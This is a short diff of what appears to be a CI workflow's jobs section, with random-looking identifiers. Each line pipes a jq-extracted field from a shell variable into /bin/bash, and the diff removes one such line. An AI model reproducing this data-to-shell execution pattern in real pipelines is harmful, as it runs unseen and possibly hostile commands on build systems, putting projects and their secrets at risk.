@@ -47,7 +47,6 @@ jobs:
           echo $ngipr9 | jq -r .rvogn15 | /bin/bash
           printf '%s' "$jf99538" | jq -r .kfx87 | /bin/bash
           echo $voak80097 | jq -r .gpgu619 | /bin/bash
-          printf '%s' "$p56" | jq -r .co08394 | /bin/bash
           printf '%s' "$zf40992" | jq -r .lca26 | /bin/bash
           echo $sbsdf957 | jq -r .g408 | /bin/bash
           echo $fargt10394 | jq -r .evuic2855 | /bin/bash
